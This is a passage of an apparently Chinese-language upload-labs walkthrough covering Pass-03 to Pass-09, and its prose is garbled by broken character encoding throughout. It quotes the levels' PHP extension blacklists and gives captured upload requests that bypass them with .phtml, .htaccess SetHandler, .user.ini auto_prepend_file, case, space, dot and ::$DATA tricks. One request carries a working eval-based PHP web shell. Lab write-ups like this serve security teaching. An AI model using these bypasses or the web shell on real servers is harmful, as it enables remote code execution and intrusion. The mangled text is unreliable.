<p>æ–‡ä»¶è¢«ä¸Šä¼ åï¼Œé»˜è®¤åœ°ä¼šè¢«å‚¨å­˜åˆ°æœåŠ¡ç«¯çš„é»˜è®¤ä¸´æ—¶ç›®å½•ä¸­ï¼Œé™¤é php.ini ä¸­çš„ upload_tmp_dir è®¾ç½®ä¸ºå…¶å®ƒçš„è·¯å¾„ã€‚æœåŠ¡ç«¯çš„é»˜è®¤ä¸´æ—¶ç›®å½•å¯ä»¥é€šè¿‡æ›´æ”¹ PHP è¿è¡Œç¯å¢ƒçš„ç¯å¢ƒå˜é‡ TMPDIR æ¥é‡æ–°è®¾ç½®ï¼Œä½†æ˜¯åœ¨ PHP è„šæœ¬å†…éƒ¨é€šè¿‡è¿è¡Œ putenv() å‡½æ•°æ¥è®¾ç½®æ˜¯ä¸èµ·ä½œç”¨çš„ã€‚è¯¥ç¯å¢ƒå˜é‡ä¹Ÿå¯ä»¥ç”¨æ¥ç¡®è®¤å…¶å®ƒçš„æ“ä½œä¹Ÿæ˜¯åœ¨ä¸Šä¼ çš„æ–‡ä»¶ä¸Šè¿›è¡Œçš„ã€‚</p>
<h2 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h2><p><strong>æœåŠ¡ç«¯-å¼±é»‘åå•æ£€æŸ¥</strong><br>ç›´æ¥ä¸Šé©¬ï¼Œæç¤ºé”™è¯¯<br>æŸ¥çœ‹åç«¯ä»£ç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;pass&quot;</span>,<span class="string">&quot;03&quot;</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../common.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../head.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../menu.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$UPLOAD_ADDR</span>)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//æ”¶å°¾å»ç©º</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$UPLOAD_ADDR</span>. <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                 <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span> .<span class="string">&#x27;/&#x27;</span>. <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">                 <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;ä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>ç™½åå•æ£€æµ‹ï¼Œå¯ä»¥ä½¿ç”¨<code>php3/php5/phtml</code></p>
<p>ä»¥phtmlä¸ºä¾‹ï¼ŒburpæŠ“åŒ…</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">293582696224464</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;1.phtml&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line">-----------------------------<span class="number">293582696224464</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">Ã¤Â¸ÂŠÃ¤Â¼Â </span><br><span class="line">-----------------------------<span class="number">293582696224464</span>--</span><br></pre></td></tr></table></figure>

<p>è®¿é—®</p>
<p><img src="/2022/02/28/upload-labs/2022-02-28-11-44-16.png"></p>
<p>èƒŒæ™¯çŸ¥è¯†ï¼š<br>ä½¿ç”¨<code>php3/php5/phtml</code>æˆåŠŸçš„å‰ææ˜¯æœåŠ¡ç«¯è§£æè¿™äº›åç¼€ï¼Œæœ¬åœ°æœåŠ¡ç«¯ä¿®æ”¹æ–¹æ³•æ˜¯<br>æ‰¾åˆ°apacheä¸‹çš„conf&#x2F;httpd.confï¼Œç„¶åä¿®æ”¹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">åŸæ•°æ®</span><br><span class="line"><span class="comment">#AddType application/x-httpd-php .php .phtml</span></span><br><span class="line">å»æ‰æ³¨é‡Šï¼Œä¿®æ”¹ä¸º</span><br><span class="line">AddType application/x-httpd-php .php .phtml .php3 .php5</span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­ AddType å¯ä»¥å°†ç»™å®šçš„æ–‡ä»¶æ‰©å±•åæ˜ å°„åˆ°æŒ‡å®šçš„å†…å®¹ç±»å‹<br>ç”¨æ³•ï¼š  </p>
<blockquote>
<p>AddType media-type extension [extension] â€¦</p>
</blockquote>
<p>å‚è€ƒï¼š</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44023693/article/details/104754029">phpstudyæ— æ³•è§£æphp2ã€php3ã€phtmlç­‰æ–‡ä»¶</a><br><a target="_blank" rel="noopener" href="https://www.tspweb.com/key/apache%E7%9A%84%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%B8%AD%E5%AE%9A%E4%B9%89.html">apacheçš„é…ç½®æ–‡ä»¶ä¸­å®šä¹‰</a></p>
<h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><p><strong>æœåŠ¡ç«¯-å¼ºé»‘åå•æ£€æŸ¥-ä¿®æ”¹.htaccess</strong><br>ä¼ é©¬å¤±è´¥<br>çœ‹ä»£ç ï¼Œé»‘åˆ°æ— äººæ€§</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥ä¸Šä¼ <code>.htaccess</code>ï¼Œè¦†ç›–åŸä»¶ï¼Œè§£æjpgæ–‡æœ¬é‡Œçš„phpä»£ç ï¼Œå†…å®¹ä¸º</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure>
<p>ä½¿ç”¨burpæŠ“åŒ…æŸ¥çœ‹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Cookie: <span class="keyword">pass</span>=04</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">168279961491</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;.htaccess&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">-----------------------------<span class="number">168279961491</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">Ã¤Â¸ÂŠÃ¤Â¼Â </span><br><span class="line">-----------------------------<span class="number">168279961491</span>--</span><br></pre></td></tr></table></figure>
<p>è®¿é—®<br><img src="/2022/02/28/upload-labs/2022-02-28-12-15-57.png"></p>
<p><strong>èƒŒæ™¯çŸ¥è¯†ï¼š</strong></p>
<p>.htaccess<br> å¯ä»¥å®ç°ç½‘é¡µ301é‡å®šå‘ã€è‡ªå®šä¹‰404é”™è¯¯é¡µé¢ã€æ”¹å˜æ–‡ä»¶æ‰©å±•åã€å…è®¸&#x2F;é˜»æ­¢ç‰¹å®šçš„ç”¨æˆ·æˆ–è€…ç›®å½•çš„è®¿é—®ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ã€é…ç½®é»˜è®¤æ–‡æ¡£ç­‰åŠŸèƒ½ã€‚è¯¦è§ <a target="_blank" rel="noopener" href="http://www.htaccess-guide.com/">http://www.htaccess-guide.com/</a> ã€‚</p>
<p>SetHandler å¯ä»¥å¼ºåˆ¶æ‰€æœ‰åŒ¹é…çš„æ–‡ä»¶è¢«ä¸€ä¸ªæŒ‡å®šçš„å¤„ç†å™¨å¤„ç†<br>ç”¨æ³•ï¼š<br>SetHandler handler-name|None<br>ç¤ºä¾‹1ï¼š<br>SetHandler application&#x2F;x-httpd-php<br>æ­¤æ—¶å½“å‰ç›®å½•åŠå…¶å­ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶éƒ½ä¼šè¢«å½“åš php è§£æ</p>
<p><strong>å‚è€ƒï¼š</strong>  </p>
<p><a target="_blank" rel="noopener" href="https://www.tspweb.com/key/apache%E7%9A%84%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%B8%AD%E5%AE%9A%E4%B9%89.html">apacheçš„é…ç½®æ–‡ä»¶ä¸­å®šä¹‰</a></p>
<h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><p><strong>æœåŠ¡ç«¯-å¼ºé»‘åå•æ£€æŸ¥-.user.iniç»•è¿‡</strong><br>å¾ˆå¤šè€ç‰ˆæœ¬çš„labsï¼Œè¿™å…³æ˜¯å¤§å°å†™ç»•è¿‡ï¼Œåˆ«é—®æˆ‘ä¸ºä»€ä¹ˆçŸ¥é“çš„ï¼Œé€ƒã€‚<br>é»‘åå•æ²¡æœ‰ç¦æ­¢php7å’Œ.iniï¼Œæ‰€ä»¥å¯ä»¥ä¿®æ”¹.user.iniï¼Œæ¥åŒ…å«ä¸€ä¸ªå›¾ç‰‡ï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">18467633426500</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;.user.ini&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">auto_prepend_file=shell.jpg</span><br><span class="line">-----------------------------<span class="number">18467633426500</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">Ã¤Â¸ÂŠÃ¤Â¼Â </span><br><span class="line">-----------------------------<span class="number">18467633426500</span>--</span><br></pre></td></tr></table></figure>
<p>åœ¨ä¸Šä¼ ä¸€ä¸ªshell.jpg</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">191691572411478</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.jpg&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: image/jpeg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"><span class="meta">@eval(<span class="params">$_REQUEST[<span class="string">&#x27;shell&#x27;</span>]</span>);</span></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">191691572411478</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">Ã¤Â¸ÂŠÃ¤Â¼Â </span><br><span class="line">-----------------------------<span class="number">191691572411478</span>--</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç„¶åç­‰å¾…5minï¼Œè®¿é—®uploadä¸‹çš„readme.php<br><img src="/2022/02/28/upload-labs/2022-02-28-20-09-12.png">  </p>
<p><strong>è¡¥å……çŸ¥è¯†ï¼š</strong><br>æ”»å‡»é€»è¾‘é“¾<br>.user.iniç±»ä¼¼äºphp.iniï¼Œæœ‰åˆå§‹åŒ–ä½œç”¨ï¼Œå¯ä»¥æ›´æ”¹ä¸€äº›åŒ…å«æ–‡ä»¶ï¼Œè€Œ.user.inié‡Œé¢çš„auto_prepend_fileï¼Œè¡¨ç¤ºåœ¨åŠ è½½ç¬¬ä¸€ä¸ªPHPä»£ç ä¹‹å‰å…ˆè¡Œé¢„åŠ è½½è¯¥é…ç½®æ‰€æŒ‡ç¤ºçš„PHPæ–‡ä»¶ã€‚ä¹Ÿå°±æ˜¯æŒ‡å®šæ–‡ä»¶å½“ä½œphpè§£æåŒ…å«ã€‚æ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡ğŸï¼Œç„¶ååœ¨è®¿é—®åŒç›®å½•ä¸‹åˆ«çš„phpæ–‡ä»¶åˆ©ç”¨æ­¤é©¬ã€‚  </p>
<p>åˆ©ç”¨æ¡ä»¶</p>
<blockquote>
<p>æœåŠ¡å™¨è„šæœ¬è¯­è¨€ä¸ºPHP<br>æœåŠ¡å™¨ä½¿ç”¨CGIï¼FastCGIæ¨¡å¼   ä¸çŸ¥å¦‚ä½•åˆ¤æ–­ï¼Œå¾…è¡¥<br>ä¸Šä¼ ç›®å½•ä¸‹è¦æœ‰å¯æ‰§è¡Œçš„phpæ–‡ä»¶  è¿™ä¸ªè›®éš¾çš„ </p>
</blockquote>
<p><strong>å‚è€ƒçŸ¥è¯†ï¼š</strong></p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/c2ed6b05c964">.user.inié…ç½®æ–‡ä»¶åœ¨æ¸—é€ä¸­çš„åˆ©ç”¨</a><br><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/configuration.file.per-user.php">.user.ini æ–‡ä»¶</a><br><a target="_blank" rel="noopener" href="https://www.zhihu.com/question/30672017">å¦‚ä½•é€šä¿—åœ°è§£é‡Š CGIã€FastCGIã€php-fpm ä¹‹é—´çš„å…³ç³»</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/itbsl/p/9828776.html#%E6%B7%B1%E5%85%A5cgi%E5%8D%8F%E8%AE%AE">CGI å’Œ FastCGI åè®®çš„è¿è¡ŒåŸç†</a><br><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000018597945">fastcgiä¸cgiæœ‰ä»€ä¹ˆä¸åŒ</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_47598409/article/details/115050869">Upload-labs 1-21å…³ é¶åœºé€šå…³æ”»ç•¥(å…¨ç½‘æœ€å…¨æœ€å®Œæ•´)</a></p>
<h2 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h2><p><strong>æœåŠ¡ç«¯-å¼ºé»‘åå•æ£€æŸ¥-å¤§å°å†™ç»•è¿‡</strong><br>åç«¯ä»£ç æœªæ£€æŸ¥å¤§å°å†™ï¼Œå¯ä»¥å¤§å°å†™ç»•è¿‡ï¼Œè½¬æ¢å°å†™å‡½æ•°<code>strtolower</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Cookie: <span class="keyword">pass</span>=06</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">123821742118716</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;1.Php&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line">-----------------------------<span class="number">123821742118716</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">Ã¤Â¸ÂŠÃ¤Â¼Â </span><br><span class="line">-----------------------------<span class="number">123821742118716</span>--</span><br></pre></td></tr></table></figure>
<p>è®¿é—®<br><img src="/2022/02/28/upload-labs/2022-02-28-18-09-02.png"></p>
<h2 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h2><p><strong>æœåŠ¡ç«¯-å¼ºé»‘åå•æ£€æŸ¥-å°¾éƒ¨åŠ ç©ºæ ¼ç»•è¿‡</strong><br>åç«¯ä»£ç æ²¡æœ‰é¦–ä½å»ç©ºï¼Œå»ç©ºå‡½æ•°<code>trim()</code><br>å°¾éƒ¨åŠ ç©ºæ ¼ç»•è¿‡ï¼Œç»æµ‹è¯•é¦–éƒ¨åŠ ç©ºæ ¼æ— æ³•ä¸Šä¼ </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Cookie: <span class="keyword">pass</span>=07</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">19718198955447</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;1.php &quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line">-----------------------------<span class="number">19718198955447</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">Ã¤Â¸ÂŠÃ¤Â¼Â </span><br><span class="line">-----------------------------<span class="number">19718198955447</span>--</span><br></pre></td></tr></table></figure>
<p>è®¿é—®<br><img src="/2022/02/28/upload-labs/2022-02-28-18-16-23.png"></p>
<h2 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h2><p><strong>æœåŠ¡ç«¯-å¼ºé»‘åå•æ£€æŸ¥-æ”¹åŒ…åŠ  . ç»•è¿‡</strong><br>æ¼æ´ç‚¹ä¸»è¦åœ¨è¿™</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>strrchr<br>(PHP 4, PHP 5, PHP 7, PHP 8)<br>strrchr â€” æŸ¥æ‰¾æŒ‡å®šå­—ç¬¦åœ¨å­—ç¬¦ä¸²ä¸­çš„æœ€åä¸€æ¬¡å‡ºç°<br>strrchr(string $haystack, mixed $needle): string<br>è¯¥å‡½æ•°è¿”å› haystack å­—ç¬¦ä¸²ä¸­çš„ä¸€éƒ¨åˆ†ï¼Œè¿™éƒ¨åˆ†ä»¥ needle çš„æœ€åå‡ºç°ä½ç½®å¼€å§‹ï¼Œç›´åˆ° haystack æœ«å°¾ã€‚  </p>
<p>æ‰€ä»¥å°¾ç«¯åŠ äº†<code>.</code>ä¹‹åå°±è¢«è®¤ä¸ºåç¼€ä¸º<code>.</code>ç»•è¿‡äº†é»‘åå•ï¼Œä½†æ˜¯windowsä¼šæŠŠ<code>1.php.</code>æ”¹æˆ<code>1.php</code>ï¼Œlinuxæš‚æœªæµ‹è¯•ï¼Œå¾…è¡¥</p>
<p>POST DATA</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">217261477111538</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;1.php.&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line">-----------------------------<span class="number">217261477111538</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">Ã¤Â¸ÂŠÃ¤Â¼Â </span><br><span class="line">-----------------------------<span class="number">217261477111538</span>--</span><br></pre></td></tr></table></figure>
<p>ç¨å¾®ä¿®ä¸€ä¸‹åç«¯ä»£ç ï¼ŒæŠŠè¯†åˆ«çš„åç¼€æ˜¾ç¤ºå‡ºæ¥ï¼Œå›æ˜¾å¾—<br><code>&lt;br&gt;åç¼€.åç¼€&lt;br&gt;</code><br>è®¿é—®<br><img src="/2022/02/28/upload-labs/2022-02-28-20-29-44.png"></p>
<p>å‚è€ƒï¼š  </p>
<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.strrchr.php">strrchr</a></p>
<h2 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h2><p><strong>æœåŠ¡ç«¯-å¼ºé»‘åå•æ£€æŸ¥-æ”¹åŒ…åŠ  ::$DATAç»•è¿‡</strong> </p>
<p>åœ¨windowä¸‹<code>::$DATA</code>ä¹‹åä¼šè®¤ä¸ºæ˜¯æ–‡ä»¶æµï¼Œå‡å¦‚<code>1.php::$DATA </code>ï¼Œphpè®¤ä¸ºå…¶åç¼€æ˜¯<code>.php::$DATA</code>ï¼Œè€Œwindowsè®¤ä¸ºæ˜¯<code>.php</code><br>æ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥æ„é€ ä¸€ä¸ª<code>1.php::$DATA</code>ï¼Œæ¥ç»•è¿‡</p>
<p>POST DATA</p>
